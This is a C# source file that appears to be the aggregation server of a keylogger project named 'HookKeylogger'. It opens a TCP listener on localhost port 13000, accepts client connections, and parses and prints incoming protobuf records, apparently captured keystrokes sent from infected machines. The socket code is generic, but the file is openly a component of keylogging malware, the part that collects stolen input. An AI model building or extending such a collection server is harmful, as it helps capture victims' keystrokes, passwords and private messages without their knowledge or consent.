using System;
using System.Net;
using System.Net.Sockets;
using HookKeylogger.Base;
using System.IO;
using HookKeylogger.AggergationServer.Types;

namespace HookKeylogger.AggergationServer
{
    class Server
    {
        ///<summary>
        ///Starts the listener for the server.
        ///</summary>
        public static void Main()
        {
            TcpListener server = null;
            try
            {
                // Set the TcpListener on port 13000.
                Int32 port = 13000;
                IPAddress localAddr = IPAddress.Parse("127.0.0.1");

                // TcpListener server = new TcpListener(port);
                server = new TcpListener(localAddr, port);

                // Start listening for client requests.
                server.Start();

                // Buffer for reading data
                Byte[] bytes = new Byte[256];
                String data = null;

                // Enter the listening loop.
                while (true)
                {
                    Console.Write("Waiting for a connection... ");

                    // Perform a blocking call to accept requests.
                    // You could also user server.AcceptSocket() here.
                    TcpClient client = server.AcceptTcpClient();
                    Console.WriteLine("Connected! From {0}", client.Client.RemoteEndPoint);

                    data = null;

                    // Get a stream object for reading and writing
                    StreamExtension stream = new StreamExtension(client.GetStream());

                    int i;
                    CI kp;
                    while (stream.IsConnected())
                    {
                        try
                        {
                            kp = CI.Parser.ParseDelimitedFrom(stream);
                            Console.WriteLine("Received: {0}", kp);
                        }
                        catch (IOException)
                        {
                            break;
                        }
                    }

                    // Shutdown and end connection
                    client.Close();
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                // Stop listening for new clients.
                server.Stop();
            }


            Console.WriteLine("\nHit enter to continue...");
            Console.Read();
        }
    }
}
